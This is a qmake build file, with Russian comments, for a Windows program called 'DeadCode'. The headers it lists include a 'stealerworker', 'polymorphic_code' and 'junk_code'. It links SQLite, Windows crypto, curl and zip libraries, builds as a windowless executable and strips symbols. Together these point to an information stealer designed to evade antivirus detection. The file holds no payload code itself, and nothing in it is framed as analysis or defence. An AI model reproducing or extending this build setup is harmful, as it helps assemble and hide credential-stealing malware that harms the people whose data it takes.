# Основные модули Qt
QT += core gui network widgets qml quick

TARGET = DeadCode
TEMPLATE = app

# Конфигурация для релиза (убрали static, предполагаем динамическую сборку Qt)
CONFIG += release

SOURCES += \
    ../src/main.cpp \
    mainwindow.cpp

HEADERS += \
    mainwindow.h \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h

FORMS += mainwindow.ui

RC_FILE = ../icon.rc

INCLUDEPATH += \
    ../src \
    . \
    C:/vcpkg/installed/x64-mingw-static/include

LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
        -lsqlite3 \
        -lzip \
        -lz \
        -lbz2 \
        -lcurl \
        -lssl \
        -lcrypto \
        -lbcrypt \
        -lws2_32 \
        -lgdiplus \
        -liphlpapi \
        -lpsapi \
        -lshlwapi \
        -lcrypt32 \
        -lgdi32 \
        -luser32 \
        -ladvapi32 \
        -lwininet \
        -lshell32 \
        -lurlmon \
        -lole32

QMAKE_CXXFLAGS += -O2 \
                  -std=c++17 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -fexceptions \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG \
                  -D_CRT_SECURE_NO_WARNINGS \
                  -Wno-deprecated-declarations \
                  -Wno-cast-function-type

QMAKE_LFLAGS = -static-libgcc -static-libstdc++ -O2 -Wl,-s -Wl,-subsystem,windows -mthreads

# Директории для сборки
DESTDIR = ../build/release
OBJECTS_DIR = ../build/release
MOC_DIR = ../build/release
UI_DIR = ../build/release

# Расширенный список файлов для очистки
QMAKE_CLEAN += \
    ../build/release/DeadCode.exe \
    ../build/release/*.o \
    ../build/release/moc_*.cpp \
    ../build/release/ui_*.h

# Настройки для Windows
win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        QMAKE_LFLAGS -= -O2
        DESTDIR = ../build/debug
        OBJECTS_DIR = ../build/debug
        MOC_DIR = ../build/debug
        UI_DIR = ../build/debug
        QMAKE_CLEAN += \
            ../build/debug/DeadCode.exe \
            ../build/debug/*.o \
            ../build/debug/moc_*.cpp \
            ../build/debug/ui_*.h
    }
}

PRE_TARGETDEPS += \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h